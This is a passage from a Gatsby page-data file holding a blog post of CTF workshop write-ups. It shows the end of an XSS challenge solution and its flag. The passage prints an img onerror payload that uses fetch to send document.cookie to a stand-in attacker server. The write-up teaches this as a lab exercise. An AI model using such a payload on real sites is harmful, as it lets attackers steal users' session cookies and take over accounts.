(and any valid mutation of it), but <code>&#x3C;img></code> is not, so we can use an <code>&#x3C;img></code> tag with the <a href=\"https://www.w3schools.com/jsref/event_onerror.asp\"><code>onerror</code></a> attribute to execute Javascript.</p>\n<p>We can use the global <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/fetch\"><code>fetch</code></a> function to send a request to our server with the cookie.</p>\n<p>If we submit the following payload:</p>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">onerror</span><span class=\"token attr-value\"><span class=\"token punctuation\">=</span><span class=\"token punctuation\">\"</span>fetch('http://my-evil-server.com/'+document.cookie)<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>img</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<p>We will see a request to our server and the \"reviewer's\" cookies will be in the path.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 600px;\"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/45bb812786cbe3f4ef67e82238de4e2b/ecf19/request-bin-flag.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsSAAALEgHS3X78AAACjUlEQVQoz12R3U/TYBSH91dpovgBKhohKqKISFSMiUBMNN55a0y88MrEG29NTPwMUYjfitEQFQzgQLchsq3t1n2xj3Zt13bd41nBmHiaJ7++5z39vafnjXR297Hv4DE6u4/Q0XmI/qFRTo1c4sTpixwfHqf36Bm2duxny/Zu0U0237ftPEDH7h52dPWyvbNXvu8hMjxymYOHR+jaf4qde4Yk2c+uvQOyPhlqm+6eYTlwUPbb6xNicDzUrgNDHO4/T//gGH3C0YELRCZffuLp8488mZzm1fsvvJ6e5fnbz0y9muHFu8/cffCS4dEb3LrzOKx79PQ9j59NS/0HHky84ezYNcau3OTc+HUuXb1NpGZ7eL5PtW5Rq9sYlo2iF8kW1qnU6uRKVRaW11hTVfSiTjbfJkuuWAhr5hZjsr/KzOwSM18XiTiuTxAENFwvxDAt9HwpPKTuO7TkaYfv2TiOgdswaTQMoY7ruvwNw6wTXVoiUrV9So5LxfJCijUHVTq0bZNqMUXVMKiZBpZ0btmO5J1QQyTniNbtBqlMgYXvUSJe0MJtBrh+gNdsYYn58qrOqmbzWzFIZuyQn2qFuFbmhyKoZZY3NZpaJ5GpEkvqG4b8F4HfZC6tcC+9yP1UlIfKd+4lF4hVLIo2KEYLzQS1rcJapYlugVYymV8Uw1ZrY0Z/tek1+ZZOMZH9xlRmnklhQptDMU1kGlScgLLdpCbjM7x/pPM1oss/Njpsyi8HwYah6/kksxUKJQ8lY6LlLFTRhFIioQlqkRXRZMFAKdVJCxUxV0Vj8RW5lGqVrJ4jXyhiyAWUy2XiSY1fao54KkMinSWW0kiksvxScqyk9ZD2ul0XT2ZQ8mXWtLwYJvgDkqDe2OM44nEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"request-bin-flag.png\"\n        title=\"request-bin-flag.png\"\n        src=\"/static/45bb812786cbe3f4ef67e82238de4e2b/0a47e/request-bin-flag.png\"\n        srcset=\"/static/45bb812786cbe3f4ef67e82238de4e2b/8a4e8/request-bin-flag.png 150w,\n/static/45bb812786cbe3f4ef67e82238de4e2b/5a46d/request-bin-flag.png 300w,\n/static/45bb812786cbe3f4ef67e82238de4e2b/0a47e/request-bin-flag.png 600w,\n/static/45bb812786cbe3f4ef67e82238de4e2b/1cfc2/request-bin-flag.png 900w,\n/static/45bb812786cbe3f4ef67e82238de4e2b/ecf19/request-bin-flag.png 948w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Flag: <code>MISCCTF{you_have_some_eXcellent_SkillS}</code></p>","frontmatter":{"date":"March 05, 2020","path":"/post/2020-03-05-workshop-01-ctf-writeups","title":"Workshop 01 CTF Writeups","author":"Joseph Surin"}}},"pageContext":{"prev":{"fileAbsolutePath":"/home/joseph/Libraries/Code/misc-website/src/posts/2020-03-11-workshop-02-ctf-writeups/index.md","frontmatter":{"title":"Workshop 02 CTF Writeups","path":"/post/2020-03-11-workshop-02-ctf-writeups"}},"next":null}}}